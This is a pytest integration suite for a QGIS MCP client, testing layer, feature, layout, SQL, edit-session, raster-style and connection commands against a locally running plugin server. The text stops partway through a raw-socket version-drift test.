import os
import shutil
import sys
import time
import uuid

import pytest

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "src"))

from qgis_mcp.client import QgisMCPClient

# --- Fixtures ---


@pytest.fixture(scope="module")
def client():
    c = QgisMCPClient()
    if not c.connect():
        pytest.skip("QGIS MCP Server is not running on localhost:9876")
    yield c
    c.disconnect()


@pytest.fixture(scope="module")
def setup_test_data(client):
    """Creates a temporary memory layer with 5 point features for testing."""
    layer_name = f"test_layer_{uuid.uuid4().hex[:8]}"

    setup_code = f"""
from qgis.core import QgsVectorLayer, QgsFeature, QgsGeometry, QgsPointXY, QgsProject

layer = QgsVectorLayer(
    "Point?crs=epsg:4326&field=id:integer&field=name:string&field=value:double",
    "{layer_name}", "memory")
assert layer.isValid(), "Failed to create memory layer"

pr = layer.dataProvider()
features = []
for i in range(5):
    f = QgsFeature()
    f.setGeometry(QgsGeometry.fromPointXY(QgsPointXY(i * 10, i * 5)))
    f.setAttributes([i, f"Feature {{i}}", float(i * 100)])
    features.append(f)

pr.addFeatures(features)
QgsProject.instance().addMapLayer(layer)
print(layer.id())
"""

    result = client.send_command("execute_code", {"code": setup_code})
    assert result.get("status") == "success", f"Failed to setup test data: {result}"

    # Find the layer we just created
    timeout = 5
    start_time = time.time()
    target_layer = None

    while time.time() - start_time < timeout:
        layers_resp = client.send_command("get_layers")
        layers = layers_resp.get("result", {}).get("layers", [])
        target_layer = next((lyr for lyr in layers if lyr["name"] == layer_name), None)
        if target_layer:
            break
        time.sleep(0.3)

    assert target_layer is not None, f"Test layer '{layer_name}' not found"

    yield target_layer["id"]

    # Cleanup
    client.send_command("remove_layer", {"layer_id": target_layer["id"]})


# --- Basic connectivity tests ---


def test_ping(client):
    resp = client.send_command("ping")
    assert resp == {"status": "success", "result": {"pong": True}}


def test_get_qgis_info(client):
    resp = client.send_command("get_qgis_info")
    assert resp["status"] == "success"
    assert "qgis_version" in resp["result"]


# --- Layer tests ---


def test_get_layers_basic(client, setup_test_data):
    resp = client.send_command("get_layers")
    assert resp["status"] == "success"
    result = resp["result"]
    assert "layers" in result
    assert "total_count" in result
    assert result["total_count"] > 0
    ids = [lyr["id"] for lyr in result["layers"]]
    assert setup_test_data in ids


def test_get_layers_pagination(client, setup_test_data):
    resp = client.send_command("get_layers", {"limit": 1, "offset": 0})
    assert resp["status"] == "success"
    result = resp["result"]
    assert len(result["layers"]) <= 1
    assert result["total_count"] >= 1


# --- Feature tests (Phase 1C: flattened features) ---


def test_feature_limit(client, setup_test_data):
    resp = client.send_command(
        "get_layer_features", {"layer_id": setup_test_data, "limit": 3, "include_geometry": False}
    )
    assert resp["status"] == "success"
    features = resp["result"]["features"]
    assert len(features) == 3
    # Phase 1C: features are flat dicts with _fid
    assert "_fid" in features[0]
    assert "id" in features[0]  # direct attribute, not nested


def test_feature_offset(client, setup_test_data):
    resp = client.send_command(
        "get_layer_features",
        {
            "layer_id": setup_test_data,
            "limit": 2,
            "offset": 3,
        },
    )
    assert resp["status"] == "success"
    features = resp["result"]["features"]
    assert len(features) == 2


def test_feature_expression_filter(client, setup_test_data):
    resp = client.send_command(
        "get_layer_features",
        {
            "layer_id": setup_test_data,
            "expression": "id >= 3",
            "limit": 10,
        },
    )
    assert resp["status"] == "success"
    features = resp["result"]["features"]
    assert len(features) == 2  # Features with id 3 and 4
    # Phase 1C: attributes at top level
    for f in features:
        assert f["id"] >= 3


def test_geometry_exclusion(client, setup_test_data):
    resp = client.send_command("get_layer_features", {"layer_id": setup_test_data, "limit": 1})
    feature = resp["result"]["features"][0]
    assert "_geometry" not in feature
    assert feature["id"] is not None


def test_geometry_inclusion(client, setup_test_data):
    resp = client.send_command(
        "get_layer_features", {"layer_id": setup_test_data, "limit": 1, "include_geometry": True}
    )
    feature = resp["result"]["features"][0]
    assert "_geometry" in feature
    assert feature["_geometry"]["type"] is not None


def test_feature_response_no_redundant_fields(client, setup_test_data):
    """Phase 1B: get_layer_features should NOT include layer_id, layer_name, geometry_included."""
    resp = client.send_command(
        "get_layer_features",
        {
            "layer_id": setup_test_data,
            "limit": 1,
        },
    )
    result = resp["result"]
    assert "layer_id" not in result
    assert "layer_name" not in result
    assert "geometry_included" not in result
    assert "features" in result
    assert "fields" in result
    assert "feature_count" in result


# --- Field statistics ---


def test_field_statistics_numeric(client, setup_test_data):
    resp = client.send_command(
        "get_field_statistics", {"layer_id": setup_test_data, "field_name": "value"}
    )
    assert resp["status"] == "success"
    result = resp["result"]
    assert result["is_numeric"] is True
    assert "mean" in result
    assert "min" in result
    assert "max" in result
    assert "count" in result
    # Phase 1B: no layer_id/field_name in response
    assert "layer_id" not in result
    assert "field_name" not in result


def test_field_statistics_string(client, setup_test_data):
    resp = client.send_command(
        "get_field_statistics", {"layer_id": setup_test_data, "field_name": "name"}
    )
    assert resp["status"] == "success"
    result = resp["result"]
    assert result["is_numeric"] is False
    assert "count" in result


def test_field_statistics_invalid_field(client, setup_test_data):
    resp = client.send_command(
        "get_field_statistics", {"layer_id": setup_test_data, "field_name": "nonexistent_field"}
    )
    assert resp["status"] == "error"


# --- Visibility ---


def test_set_layer_visibility(client, setup_test_data):
    # Hide
    resp = client.send_command(
        "set_layer_visibility", {"layer_id": setup_test_data, "visible": False}
    )
    assert resp["status"] == "success"
    assert resp["result"]["visible"] is False
    # Phase 1B: no layer_id in response
    assert "layer_id" not in resp["result"]

    # Show again
    resp = client.send_command(
        "set_layer_visibility", {"layer_id": setup_test_data, "visible": True}
    )
    assert resp["status"] == "success"
    assert resp["result"]["visible"] is True


# --- Canvas extent ---


def test_get_canvas_extent(client):
    resp = client.send_command("get_canvas_extent")
    assert resp["status"] == "success"
    result = resp["result"]
    assert "xmin" in result
    assert "ymin" in result
    assert "xmax" in result
    assert "ymax" in result
    assert "crs" in result


def test_set_canvas_extent(client):
    resp = client.send_command("set_canvas_extent", {"xmin": 0, "ymin": 0, "xmax": 10, "ymax": 10})
    assert resp["status"] == "success"
    assert "extent" in resp["result"]


# --- Layer info / schema ---


def test_get_layer_info(client, setup_test_data):
    resp = client.send_command("get_layer_info", {"layer_id": setup_test_data})
    assert resp["status"] == "success"
    result = resp["result"]
    assert result["id"] == setup_test_data
    assert "crs" in result
    assert "fields" in result
    assert "feature_count" in result


def test_get_layer_schema(client, setup_test_data):
    resp = client.send_command("get_layer_schema", {"layer_id": setup_test_data})
    assert resp["status"] == "success"
    result = resp["result"]
    # Phase 1B: no layer_id/layer_name in response
    assert "layer_id" not in result
    assert "layer_name" not in result
    field_names = [f["name"] for f in result["fields"]]
    assert "id" in field_names
    assert "name" in field_names
    assert "value" in field_names


# --- Batch commands ---


def test_batch_commands(client, setup_test_data):
    resp = client.send_command(
        "batch",
        {
            "commands": [
                {"type": "ping", "params": {}},
                {"type": "get_layers", "params": {"limit": 5}},
            ]
        },
    )
    assert resp["status"] == "success"
    results = resp["result"]
    assert len(results) == 2
    assert results[0]["status"] == "success"
    assert results[0]["result"]["pong"] is True
    assert results[1]["status"] == "success"


@pytest.mark.skipif(
    not os.environ.get("QGIS_MCP_TOKEN", "").strip(),
    reason="Set QGIS_MCP_TOKEN (matching the running plugin) to test token auth",
)
def test_batch_under_token_auth(client, setup_test_data):
    """Regression: with token auth ON, batched sub-commands must still run.

    The client attaches the token to the outer batch command only; the plugin
    authenticates that command, then dispatches each sub-command internally
    without re-authenticating. A regression here would reject every sub-command
    with "Authentication failed".
    """
    resp = client.send_command(
        "batch",
        {
            "commands": [
                {"type": "ping", "params": {}},
                {"type": "get_layers", "params": {"limit": 5}},
            ]
        },
    )
    assert resp["status"] == "success"
    results = resp["result"]
    assert len(results) == 2
    assert all(r["status"] == "success" for r in results)


# --- Phase 1B: remove_layer and zoom_to_layer return {"ok": True} ---


def test_zoom_to_layer(client, setup_test_data):
    resp = client.send_command("zoom_to_layer", {"layer_id": setup_test_data})
    assert resp["status"] == "success"
    assert resp["result"] == {"ok": True}


# --- Phase 2: New tools (live QGIS) ---


def test_create_memory_layer(client):
    resp = client.send_command(
        "create_memory_layer",
        {
            "name": f"test_mem_{uuid.uuid4().hex[:6]}",
            "geometry_type": "Point",
            "crs": "EPSG:4326",
            "fields": [{"name": "id", "type": "integer"}, {"name": "label", "type": "string"}],
        },
    )
    assert resp["status"] == "success"
    result = resp["result"]
    assert "id" in result
    assert result["feature_count"] == 0
    # Cleanup
    client.send_command("remove_layer", {"layer_id": result["id"]})


def test_add_and_delete_features(client, setup_test_data):
    # Add 2 features
    resp = client.send_command(
        "add_features",
        {
            "layer_id": setup_test_data,
            "features": [
                {
                    "attributes": {"id": 10, "name": "Added1", "value": 999.0},
                    "geometry_wkt": "POINT(50 25)",
                },
                {
                    "attributes": {"id": 11, "name": "Added2", "value": 888.0},
                    "geometry_wkt": "POINT(60 30)",
                },
            ],
        },
    )
    assert resp["status"] == "success"
    assert resp["result"]["added"] == 2

    # Verify
    resp = client.send_command(
        "get_layer_features",
        {
            "layer_id": setup_test_data,
            "expression": "id >= 10",
            "limit": 10,
        },
    )
    assert resp["status"] == "success"
    assert len(resp["result"]["features"]) == 2

    # Delete by expression
    resp = client.send_command(
        "delete_features",
        {
            "layer_id": setup_test_data,
            "expression": "id >= 10",
        },
    )
    assert resp["status"] == "success"
    assert resp["result"]["deleted"] == 2


def test_add_features_rejects_bad_input(client, setup_test_data):
    """Bad feature dicts must error, not silently create null-geometry features."""
    before = client.send_command("get_layer_features", {"layer_id": setup_test_data, "limit": 1})
    assert before["status"] == "success"

    bad_cases = [
        # Wrong geometry key (issue #24): used to add a null-geometry feature
        [{"attributes": {"id": 90}, "geometry": "POINT(1 2)"}],
        # Unknown field name: used to be dropped silently
        [{"attributes": {"nosuchfield": 1}, "geometry_wkt": "POINT(1 2)"}],
        # Unparseable WKT: used to add a null-geometry feature
        [{"attributes": {"id": 91}, "geometry_wkt": "NOT WKT AT ALL"}],
    ]
    for features in bad_cases:
        resp = client.send_command(
            "add_features", {"layer_id": setup_test_data, "features": features}
        )
        assert resp["status"] == "error", features

    # A batch with one bad feature adds nothing
    resp = client.send_command(
        "add_features",
        {
            "layer_id": setup_test_data,
            "features": [
                {"attributes": {"id": 92}, "geometry_wkt": "POINT(1 2)"},
                {"attributes": {"id": 93}, "geometry_wkt": "bogus"},
            ],
        },
    )
    assert resp["status"] == "error"
    resp = client.send_command(
        "get_layer_features",
        {"layer_id": setup_test_data, "expression": "id >= 90", "limit": 10},
    )
    assert resp["status"] == "success"
    assert resp["result"]["features"] == []


def test_update_features_rejects_bad_input(client, setup_test_data):
    """Bad update dicts must error instead of reporting a no-op as success."""
    resp = client.send_command("get_layer_features", {"layer_id": setup_test_data, "limit": 1})
    fid = resp["result"]["features"][0]["_fid"]

    bad_cases = [
        # Unknown field name: used to be dropped silently
        [{"fid": fid, "attributes": {"nosuchfield": 1}}],
        # fid that isn't in the layer: changeAttributeValues ignores it and returns True
        [{"fid": 10**9, "attributes": {"name": "ghost"}}],
        # update_features has never supported geometry; saying so beats ignoring it
        [{"fid": fid, "geometry_wkt": "POINT(1 2)", "attributes": {"name": "x"}}],
        # Missing fid used to raise a bare KeyError
        [{"attributes": {"name": "x"}}],
    ]
    for updates in bad_cases:
        resp = client.send_command(
            "update_features", {"layer_id": setup_test_data, "updates": updates}
        )
        assert resp["status"] == "error", updates


def test_update_features(client, setup_test_data):
    # Get first feature's fid
    resp = client.send_command(
        "get_layer_features",
        {
            "layer_id": setup_test_data,
            "limit": 1,
        },
    )
    fid = resp["result"]["features"][0]["_fid"]
    old_name = resp["result"]["features"][0]["name"]

    # Update it
    resp = client.send_command(
        "update_features",
        {
            "layer_id": setup_test_data,
            "updates": [{"fid": fid, "attributes": {"name": "UpdatedName"}}],
        },
    )
    assert resp["status"] == "success"
    assert resp["result"]["updated"] == 1

    # Verify
    resp = client.send_command(
        "get_layer_features",
        {
            "layer_id": setup_test_data,
            "expression": "\"name\" = 'UpdatedName'",
            "limit": 1,
        },
    )
    assert len(resp["result"]["features"]) == 1

    # Restore
    client.send_command(
        "update_features",
        {"layer_id": setup_test_data, "updates": [{"fid": fid, "attributes": {"name": old_name}}]},
    )


def test_select_and_clear(client, setup_test_data):
    # Select by expression
    resp = client.send_command(
        "select_features",
        {
            "layer_id": setup_test_data,
            "expression": "id < 3",
        },
    )
    assert resp["status"] == "success"
    assert resp["result"]["selected"] == 3  # ids 0, 1, 2

    # Get selection
    resp = client.send_command(
        "get_selection",
        {
            "layer_id": setup_test_data,
        },
    )
    assert resp["status"] == "success"
    assert resp["result"]["count"] == 3

    # Clear
    resp = client.send_command(
        "clear_selection",
        {
            "layer_id": setup_test_data,
        },
    )
    assert resp["status"] == "success"
    assert resp["result"]["ok"] is True

    # Verify cleared
    resp = client.send_command(
        "get_selection",
        {
            "layer_id": setup_test_data,
        },
    )
    assert resp["result"]["count"] == 0


def test_find_layer(client, setup_test_data):
    # Get the layer name first
    resp = client.send_command("get_layers")
    layers = resp["result"]["layers"]
    test_layer = next(lyr for lyr in layers if lyr["id"] == setup_test_data)
    assert test_layer["name"]  # ensure layer has a name

    # Find by substring
    resp = client.send_command("find_layer", {"name_pattern": "test_layer"})
    assert resp["status"] == "success"
    assert resp["result"]["count"] >= 1
    found_ids = [lyr["id"] for lyr in resp["result"]["layers"]]
    assert setup_test_data in found_ids


def test_list_processing_algorithms(client):
    resp = client.send_command("list_processing_algorithms", {"search": "buffer"})
    assert resp["status"] == "success"
    assert resp["result"]["count"] >= 1
    ids = [a["id"] for a in resp["result"]["algorithms"]]
    assert any("buffer" in aid.lower() for aid in ids)


def test_get_algorithm_help(client):
    resp = client.send_command("get_algorithm_help", {"algorithm_id": "native:buffer"})
    assert resp["status"] == "success"
    result = resp["result"]
    assert result["id"] == "native:buffer"
    assert "parameters" in result
    assert len(result["parameters"]) > 0


def test_list_layouts(client):
    resp = client.send_command("list_layouts")
    assert resp["status"] == "success"
    assert "layouts" in resp["result"]
    assert "count" in resp["result"]


def test_render_map_base64(client):
    resp = client.send_command("render_map_base64", {"width": 400, "height": 300})
    assert resp["status"] == "success"
    result = resp["result"]
    assert "base64_data" in result
    assert result["mime_type"] == "image/png"
    assert len(result["base64_data"]) > 100  # non-trivial image


# --- Edge cases ---


def test_invalid_layer_id(client):
    resp = client.send_command(
        "get_layer_features", {"layer_id": "nonexistent_layer_id", "limit": 1}
    )
    assert resp["status"] == "error"


def test_invalid_expression(client, setup_test_data):
    resp = client.send_command(
        "get_layer_features",
        {
            "layer_id": setup_test_data,
            "expression": "INVALID SYNTAX !!!",
            "limit": 1,
        },
    )
    # QGIS 4.0 silently returns 0 features for invalid expressions
    # instead of raising an error (QGIS 3.x returned error).
    assert resp["status"] in ("error", "success")
    if resp["status"] == "success":
        assert len(resp["result"]["features"]) == 0


def test_large_data_buffer(client):
    large_string_code = """
data = "X" * 100000
print(data)
"""
    resp = client.send_command("execute_code", {"code": large_string_code}, timeout=60)
    assert resp["status"] == "success"
    assert len(resp["result"]["stdout"]) >= 100000


def test_raster_info_no_redundant_fields(client, setup_test_data):
    """Phase 1B: get_raster_info stripped layer_id and name (tested via vector error)."""
    resp = client.send_command("get_raster_info", {"layer_id": setup_test_data})
    # Our test layer is vector, so this should error
    assert resp["status"] == "error"


# --- Phase 8: layout/atlas authoring, query & management ---


def test_layout_build_and_inspect(client):
    name = f"layout_{uuid.uuid4().hex[:8]}"
    assert client.send_command("create_layout", {"name": name})["status"] == "success"
    assert (
        client.send_command(
            "add_layout_map", {"layout_name": name, "x": 10, "y": 10, "width": 100, "height": 80}
        )["status"]
        == "success"
    )
    assert (
        client.send_command("add_layout_label", {"layout_name": name, "text": "Title"})["status"]
        == "success"
    )
    assert client.send_command("add_layout_legend", {"layout_name": name})["status"] == "success"
    assert client.send_command("add_layout_scalebar", {"layout_name": name})["status"] == "success"

    info = client.send_command("get_layout_info", {"layout_name": name})
    assert info["status"] == "success"
    types = {it["type"] for it in info["result"]["items"]}
    assert "QgsLayoutItemMap" in types
    assert "QgsLayoutItemLabel" in types

    # cleanup
    assert client.send_command("remove_layout", {"layout_name": name})["status"] == "success"


def test_layout_table(client, setup_test_data):
    name = f"layout_{uuid.uuid4().hex[:8]}"
    client.send_command("create_layout", {"name": name})
    resp = client.send_command(
        "add_layout_table", {"layout_name": name, "layer_id": setup_test_data}
    )
    assert resp["status"] == "success"
    client.send_command("remove_layout", {"layout_name": name})


def test_configure_atlas(client, setup_test_data):
    name = f"layout_{uuid.uuid4().hex[:8]}"
    client.send_command("create_layout", {"name": name})
    client.send_command(
        "add_layout_map", {"layout_name": name, "x": 10, "y": 10, "width": 100, "height": 80}
    )
    resp = client.send_command(
        "configure_atlas", {"layout_name": name, "coverage_layer": setup_test_data}
    )
    assert resp["status"] == "success"
    assert resp["result"]["count"] == 5
    client.send_command("remove_layout", {"layout_name": name})


def test_execute_sql_inline(client, setup_test_data):
    layers_resp = client.send_command("get_layers")
    layer = next(lyr for lyr in layers_resp["result"]["layers"] if lyr["id"] == setup_test_data)
    query = f'select count(*) as n from "{layer["name"]}"'
    resp = client.send_command("execute_sql", {"query": query})
    assert resp["status"] == "success"
    assert resp["result"]["rows"][0]["n"] == 5


def test_evaluate_expression(client, setup_test_data):
    resp = client.send_command("evaluate_expression", {"expression": "1 + 41"})
    assert resp["status"] == "success"
    assert resp["result"]["result"] == 42


def test_evaluate_expression_aggregate(client, setup_test_data):
    layers_resp = client.send_command("get_layers")
    layer = next(lyr for lyr in layers_resp["result"]["layers"] if lyr["id"] == setup_test_data)
    expr = f"aggregate('{layer['name']}', 'sum', \"value\")"
    resp = client.send_command("evaluate_expression", {"expression": expr})
    assert resp["status"] == "success"
    assert resp["result"]["result"] == 1000.0  # 0+100+200+300+400


def test_identify_features(client, setup_test_data):
    # feature 0 is at (0, 0)
    resp = client.send_command(
        "identify_features",
        {"point": [0.0, 0.0], "tolerance": 1.0, "layer_ids": [setup_test_data]},
    )
    assert resp["status"] == "success"
    assert resp["result"]["results"][0]["count"] >= 1


def test_duplicate_layer(client, setup_test_data):
    resp = client.send_command(
        "duplicate_layer", {"layer_id": setup_test_data, "new_name": "dup_test"}
    )
    assert resp["status"] == "success"
    new_id = resp["result"]["output_layer_id"]
    assert new_id != setup_test_data
    client.send_command("remove_layer", {"layer_id": new_id})


def test_set_layer_order(client, setup_test_data):
    resp = client.send_command("set_layer_order", {"layer_ids": [setup_test_data]})
    assert resp["status"] == "success"


def test_execute_sql_ignores_non_vector_layers(client, setup_test_data):
    """A loaded raster must not invalidate the virtual layer (default source list)."""
    import tempfile

    tif = os.path.join(tempfile.gettempdir(), f"sqltest_{uuid.uuid4().hex[:8]}.tif")
    resp = client.send_command(
        "execute_processing",
        {
            "algorithm": "native:createconstantrasterlayer",
            "parameters": {
                "EXTENT": "0,4,44,48 [EPSG:4326]",
                "TARGET_CRS": "EPSG:4326",
                "PIXEL_SIZE": 0.5,
                "NUMBER": 1,
                "OUTPUT": tif,
            },
        },
    )
    assert resp["status"] == "success"
    add = client.send_command("add_raster_layer", {"path": tif, "name": "sqltest_raster"})
    assert add["status"] == "success"
    raster_id = add["result"]["id"]
    try:
        layers_resp = client.send_command("get_layers")
        layer = next(lyr for lyr in layers_resp["result"]["layers"] if lyr["id"] == setup_test_data)
        resp = client.send_command(
            "execute_sql", {"query": f'select count(*) as n from "{layer["name"]}"'}
        )
        assert resp["status"] == "success", resp.get("message")
        assert resp["result"]["rows"][0]["n"] == 5

        # An explicitly requested raster is a hard error, not a silent skip.
        resp = client.send_command("execute_sql", {"query": "select 1", "layers": [raster_id]})
        assert resp["status"] == "error"
        assert "not a vector layer" in resp["message"]
    finally:
        client.send_command("remove_layer", {"layer_id": raster_id})


def test_layer_extent_empty_layer_is_json_safe(client):
    """An empty layer has a NaN extent - it must serialise as null, not NaN."""
    resp = client.send_command(
        "create_memory_layer",
        {"name": f"empty_{uuid.uuid4().hex[:8]}", "geometry_type": "Point", "crs": "EPSG:4326"},
    )
    assert resp["status"] == "success"
    layer_id = resp["result"]["id"]
    try:
        resp = client.send_command("get_layer_extent", {"layer_id": layer_id})
        assert resp["status"] == "success"
        assert resp["result"]["empty"] is True
        assert resp["result"]["xmin"] is None

        # A single point is a real (zero-area) extent, not an empty one.
        client.send_command(
            "add_features",
            {"layer_id": layer_id, "features": [{"geometry_wkt": "POINT(1 45)"}]},
        )
        resp = client.send_command("get_layer_extent", {"layer_id": layer_id})
        assert resp["status"] == "success"
        assert resp["result"].get("empty") is None
        assert resp["result"]["xmin"] == 1.0
        assert resp["result"]["ymax"] == 45.0
    finally:
        client.send_command("remove_layer", {"layer_id": layer_id})


def test_run_model_defaults_destination_parameters(client, setup_test_data):
    """Omitting a model's sink parameter must not abort the run."""
    name = f"livemodel_{uuid.uuid4().hex[:6]}"
    resp = client.send_command(
        "create_processing_model",
        {
            "name": name,
            "inputs": [{"name": "src", "type": "vector"}],
            "steps": [
                {
                    "id": "buf",
                    "algorithm": "native:buffer",
                    "parameters": {"INPUT": "@src", "DISTANCE": 0.1},
                }
            ],
        },
    )
    assert resp["status"] == "success", resp.get("message")
    model_name = resp["result"]["name"]
    model_path = resp["result"]["path"]
    try:
        resp = client.send_command(
            "run_model", {"model": f"model:{model_name}", "parameters": {"src": setup_test_data}}
        )
        assert resp["status"] == "success", resp.get("message")
    finally:
        # The model file lands in the QGIS profile's models folder; without
        # this, every live run leaves one behind and they pile up.
        client.send_command(
            "execute_code",
            {
                "code": (
                    f"import os\nos.remove(r'{model_path}')\n"
                    "from qgis.core import QgsApplication\n"
                    "QgsApplication.processingRegistry().providerById('model').refreshAlgorithms()"
                )
            },
        )


# --- Edit sessions, geometry writes, raster style, connections ---


def test_edit_session_buffers_then_rolls_back(client, setup_test_data):
    """Writes made inside a session must be undoable and discardable."""
    layer_id = setup_test_data
    assert client.send_command("start_editing", {"layer_id": layer_id})["status"] == "success"
    try:
        added = client.send_command(
            "add_features",
            {"layer_id": layer_id, "features": [{"attributes": {"name": "buffered"}}]},
        )
        assert added["result"]["buffered"] is True

        status = client.send_command("get_edit_status", {"layer_id": layer_id})["result"]
        assert status["editable"] is True
        assert status["pending"]["added"] == 1
        assert status["can_undo"] is True

        undone = client.send_command("undo_edits", {"layer_id": layer_id})["result"]
        assert undone["undone"] == 1
        assert undone["can_redo"] is True
        redone = client.send_command("redo_edits", {"layer_id": layer_id})["result"]
        assert redone["redone"] == 1
    finally:
        rolled = client.send_command("rollback_edits", {"layer_id": layer_id})
        assert rolled["status"] == "success"
    # The 5 fixture features survive; the buffered one does not.
    feats = client.send_command("get_layer_features", {"layer_id": layer_id, "limit": 50})
    assert len(feats["result"]["features"]) == 5


def test_commit_edits_persists(client, setup_test_data):
    layer_id = setup_test_data
    client.send_command("start_editing", {"layer_id": layer_id})
    client.send_command(
        "add_features", {"layer_id": layer_id, "features": [{"attributes": {"name": "kept"}}]}
    )
    assert client.send_command("commit_edits", {"layer_id": layer_id})["status"] == "success"
    try:
        feats = client.send_command(
            "get_layer_features", {"layer_id": layer_id, "expression": "\"name\" = 'kept'"}
        )
        assert len(feats["result"]["features"]) == 1
        # Session is closed, so a second commit is an error rather than a no-op.
        assert client.send_command("commit_edits", {"layer_id": layer_id})["status"] == "error"
    finally:
        client.send_command(
            "delete_features", {"layer_id": layer_id, "expression": "\"name\" = 'kept'"}
        )


def test_update_feature_geometry_without_session(client, setup_test_data):
    layer_id = setup_test_data
    feats = client.send_command(
        "get_layer_features", {"layer_id": layer_id, "limit": 1, "include_geometry": True}
    )
    fid = feats["result"]["features"][0]["_fid"]
    resp = client.send_command(
        "update_feature_geometry",
        {"layer_id": layer_id, "updates": [{"fid": fid, "geometry_wkt": "POINT(7 8)"}]},
    )
    assert resp["result"] == {"updated": 1, "buffered": False}
    moved = client.send_command(
        "get_layer_features",
        {"layer_id": layer_id, "expression": f"$id = {fid}", "include_geometry": True},
    )
    # Point geometry comes back as a dict with a `wkt` key (polygons/lines get a summary)
    assert "7 8" in moved["result"]["features"][0]["_geometry"]["wkt"].replace("(", " ")

    bad = client.send_command(
        "update_feature_geometry",
        {"layer_id": layer_id, "updates": [{"fid": fid, "geometry_wkt": "NOT WKT"}]},
    )
    assert bad["status"] == "error"


def test_set_raster_style_rejects_vector_layer(client, setup_test_data):
    resp = client.send_command(
        "set_raster_style",
        {"layer_id": setup_test_data, "style_type": "singleband_pseudocolor"},
    )
    assert resp["status"] == "error"
    assert "Not a raster layer" in resp["message"]


def test_set_raster_style_applies_each_renderer(client):
    """Style a real single-band raster with every supported renderer."""
    create = client.send_command(
        "execute_code",
        {
            "code": """
import os, tempfile
from osgeo import gdal
from qgis.core import QgsProject, QgsRasterLayer

path = os.path.join(tempfile.mkdtemp(), "live_dem.tif")
ds = gdal.GetDriverByName("GTiff").Create(path, 8, 8, 1, gdal.GDT_Float32)
ds.SetGeoTransform((0, 1, 0, 8, 0, -1))
ds.GetRasterBand(1).WriteArray(
    __import__("numpy").arange(64, dtype="float32").reshape(8, 8))
ds = None
layer = QgsRasterLayer(path, "live_dem", "gdal")
QgsProject.instance().addMapLayer(layer)
print(layer.id())
"""
        },
    )
    assert create["status"] == "success", create.get("message")
    layer_id = create["result"]["stdout"].strip().splitlines()[-1]
    try:
        for style_type, extra in (
            ("singleband_pseudocolor", {"color_ramp": "Viridis", "classes": 4}),
            ("singleband_gray", {"gradient": "white_to_black"}),
            ("hillshade", {"azimuth": 300.0, "z_factor": 2.0}),
        ):
            resp = client.send_command(
                "set_raster_style",
                {"layer_id": layer_id, "style_type": style_type, **extra},
            )
            assert resp["status"] == "success", resp.get("message")
            assert resp["result"]["applied"]["style_type"] == style_type

        # Bounds default to the band statistics when not supplied.
        applied = client.send_command(
            "set_raster_style",
            {"layer_id": layer_id, "style_type": "singleband_pseudocolor"},
        )["result"]["applied"]
        assert applied["min"] == 0.0 and applied["max"] == 63.0

        bad = client.send_command(
            "set_raster_style", {"layer_id": layer_id, "style_type": "rainbow"}
        )
        assert bad["status"] == "error" and "Unknown style_type" in bad["message"]
    finally:
        client.send_command("remove_layer", {"layer_id": layer_id})


def test_list_connections_and_unknown_provider(client):
    resp = client.send_command("list_connections")
    assert resp["status"] == "success"
    assert isinstance(resp["result"]["connections"], list)
    # Saved connections are profile-specific, so only the shape is asserted;
    # what must always hold is that credentials never come back.
    assert not any("password=" in c.get("uri", "").lower() for c in resp["result"]["connections"])

    bad = client.send_command("list_connections", {"provider": "nosuchprovider"})
    assert bad["status"] == "error"
    assert "Unknown data provider" in bad["message"]


def test_create_postgresql_connection_rejects_unknown_auth_config(client):
    name = "missing_auth_connection"
    response = client.send_command(
        "create_postgresql_connection",
        {
            "name": name,
            "connection_mode": "endpoint_using_auth_manager",
            "host": "db.example.test",
            "port": 5432,
            "database": "gis",
            "auth_config_id": "missing_auth_config",
        },
    )
    assert response["status"] == "error"
    assert "Authentication configuration" in response["message"]

    connections = client.send_command("list_connections", {"provider": "postgres"})
    assert connections["status"] == "success"
    assert name not in {entry["name"] for entry in connections["result"]["connections"]}


def test_add_web_layer_crs_is_applied_or_refused(client):
    """The crs argument used to be accepted and silently dropped.

    XYZ is a Web Mercator tile scheme and the provider ignores `crs=` in the uri,
    so asking for anything else is now an error instead of a layer that quietly
    is not in the requested CRS. A dummy tile URL is enough: the wms provider
    validates the uri without fetching a tile.
    """
    url = "https://tiles.invalid/{z}/{x}/{y}.png"
    added = client.send_command(
        "add_web_layer", {"url": url, "service": "xyz", "name": "live xyz probe"}
    )
    assert added["status"] == "success", added.get("message")
    # The response reports the CRS the layer actually got, not the one requested.
    assert added["result"]["crs"] == "EPSG:3857"
    layer_ids = [added["result"]["id"]]
    try:
        # Explicitly asking for the CRS it already is stays a no-op success.
        same = client.send_command(
            "add_web_layer", {"url": url, "service": "xyz", "crs": "EPSG:3857"}
        )
        assert same["status"] == "success", same.get("message")
        layer_ids.append(same["result"]["id"])

        conflicting = client.send_command(
            "add_web_layer", {"url": url, "service": "xyz", "crs": "EPSG:2154"}
        )
        assert conflicting["status"] == "error"
        assert "always EPSG:3857" in conflicting["message"]

        nonsense = client.send_command(
            "add_web_layer", {"url": url, "service": "xyz", "crs": "EPSG:notacrs"}
        )
        assert nonsense["status"] == "error"
        assert "Invalid CRS" in nonsense["message"]
    finally:
        for layer_id in layer_ids:
            client.send_command("remove_layer", {"layer_id": layer_id})


def test_plugin_records_the_client_version_it_is_told(client):
    """diagnose reports the MCP server versions that have connected.

    The plugin half and the server half are installed by different mechanisms
    (QGIS Plugin Manager vs the uvx cache), so this is what makes drift visible
    from inside QGIS rather than only in the client's own version_match check.
    """
    from qgis_mcp.protocol import get_client_version

    client.send_command("ping")  # every command announces the version
    resp = client.send_command("diagnose")
    assert resp["status"] == "success", resp.get("message")

    check = next(c for c in resp["result"]["checks"] if c["name"] == "client_versions")
    assert get_client_version() in check["detail"]["seen"], check
    assert check["detail"]["plugin"], check
    # Status follows whether anything seen differs from the plugin's own version.
    drifted = check["detail"]["drifted"]
    assert check["status"] == ("mismatch" if drifted else "ok")
    assert all(v != check["detail"]["plugin"] for v in drifted)


def test_drift_is_logged_once_and_never_shown_on_the_canvas(client):
    """A drifted MCP server leaves a line in the log, and nothing else.

    Without it, drift is invisible unless someone runs diagnose or opens the
    configurator. The message bar is deliberately not used: the user did not do
    anything to trigger this, and a banner over the canvas for something
    advisory is what teaches people to dismiss the bar.
    """
    import json
    import socket
    import struct

    from qgis_mcp.protocol import HEADER_STRUCT

    def raw_ping(version):
        sock = socket.create_connection(("localhost", 9876), timeout=10)
        try:
            payload = json.dumps(
                {
                    "type": "ping",
                    "params": {},
                    "client_version": version,
                    "client_install": "uvx",
                }
            ).encode()
            sock.sendall(HEADER_STRUCT.pack(len(payload)) + payload)
            head = b""
            while len(head) < 4:
